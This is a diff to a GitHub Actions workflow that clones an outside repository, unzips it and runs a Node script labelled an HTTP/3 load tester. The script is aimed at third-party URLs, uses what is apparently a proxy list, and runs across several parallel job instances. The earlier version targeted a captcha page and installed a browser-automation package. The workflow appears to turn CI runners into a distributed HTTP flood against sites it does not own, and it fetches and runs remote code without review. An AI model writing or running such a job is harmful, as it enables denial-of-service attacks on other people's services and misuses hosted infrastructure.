@@ -30,18 +30,21 @@ jobs:
         with:
           python-version: '3.10'
       
-      
+    
       
       - name: Install Node.js dependencies
-        run: npm install  puppeteer-real-browser  axios chalk@4 colors request 
+        run: npm install  hpack  axios chalk@4 colors request 
             
       - name: Run HTTP/3 load tester
         run: |
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
+          
           unzip Fc-main.zip
+          mc y1.txt Fc-main/y1.txt
+          
           cd Fc-main
-          node m.js  https://captcha.fo7y4.cc/htefso 200 3 3 3
+          node kl.js GET https://rapidis.gay/6901966783-27a9fc9d-6c8a-4f8f-8162-9e3412e3e904 300 4 120 y1.txt --auth --debug --full
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
